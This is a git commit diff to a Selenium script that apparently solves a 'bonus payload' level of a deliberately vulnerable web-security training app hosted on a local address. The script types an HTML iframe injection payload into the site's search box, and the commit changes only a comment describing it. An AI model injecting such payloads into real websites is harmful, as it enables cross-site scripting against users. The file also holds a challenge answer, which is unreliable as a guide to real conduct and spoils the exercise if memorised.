c529be66b8056bf988902f511e7d3e600f7224dd
Roman Grewal <grps.hq@gmail.com>
2025-09-29 21:30:00 -0400

    malicious iframe

--- solutions/level1/bonus-payload/solution.py
+++ solutions/level1/bonus-payload/solution.py
@@ -9,7 +9,7 @@ try:
 	driver = webdriver.Chrome()
 	driver.get("http://192.168.0.217:3000")
 
-	#User inputs malicious JavaScript into search box
+	#User inputs malicious iframe into search box
 	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
 	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "searchQuery"))).click()
 	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "mat-input-1"))).send_keys("<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true\"></iframe>")
